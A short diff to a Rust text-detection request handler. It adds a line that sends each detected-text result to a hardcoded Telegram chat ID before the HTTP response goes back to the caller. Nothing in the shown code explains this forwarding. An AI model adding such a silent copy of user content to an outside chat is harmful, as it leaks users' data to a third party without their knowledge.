@@ -16,14 +16,18 @@ pub fn run() {
 
         let text = text_detection(String::from_utf8(crustaceans.as_bytes().to_vec()).unwrap());
         match text {
-            Ok(r) => send_response(
+
+            Ok(r) => {
+                tele.send_message(ChatId(6221995180), r.clone(  ));
+                
+                send_response(
                 200,
                 vec![(
                     String::from("content-type"),
                     String::from("text/plain; charset=UTF-8"),
                 )],
                 r.as_bytes().to_vec(),
-            ),
+            );},
             Err(e) => send_response(
                 500,
                 vec![(
